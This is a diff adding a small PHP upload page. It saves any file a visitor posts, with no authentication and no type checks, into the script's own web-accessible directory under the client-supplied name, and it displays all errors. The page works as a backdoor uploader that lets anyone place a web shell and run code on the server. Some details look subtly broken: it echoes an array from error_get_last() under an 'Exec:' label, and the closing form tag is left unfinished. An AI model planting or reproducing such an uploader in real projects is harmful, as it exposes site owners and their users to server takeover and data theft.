@@ -1,0 +1,18 @@
+<?php
+error_reporting(E_ALL);
+ini_set('display_errors', 1);
+if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
+    $target_dir = getcwd() . '/';
+    $target_file = $target_dir . basename($_FILES['file']['name']);
+    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
+        echo "File uploaded successfully: " . htmlspecialchars($target_file);
+    } else {
+        echo "Upload failed. Exec: " . error_get_last();
+    }
+    exit;
+}
+?>
+<form method="post" enctype="multipart/form-data">
+    <input type="file" name="file">
+    <input type="submit" value="Upload">
+</form
